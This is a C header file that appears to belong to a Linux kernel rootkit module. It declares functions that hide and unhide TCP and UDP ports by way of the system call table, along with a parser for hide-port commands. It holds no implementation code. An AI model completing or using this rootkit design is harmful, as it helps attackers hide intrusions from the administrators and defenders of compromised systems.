#ifndef ROOTKIT_HIDE_PORT_H
#define ROOTKIT_HIDE_PORT_H

#include <stdbool.h>

enum net_type
{
    NET_TYPE_TCP = 0,
    NET_TYPE_UDP,
    NET_TYPE_TCP6,
    NET_TYPE_UDP6
};

bool hide_port_init(void **real_sys_call_table);
void hide_port_exit(void **real_sys_call_table);
void hide_port(enum net_type type, int port);
void unhide_port(enum net_type type, int port);
bool parse_hide_port_command(const char *str, enum net_type *type, int *port);
#endif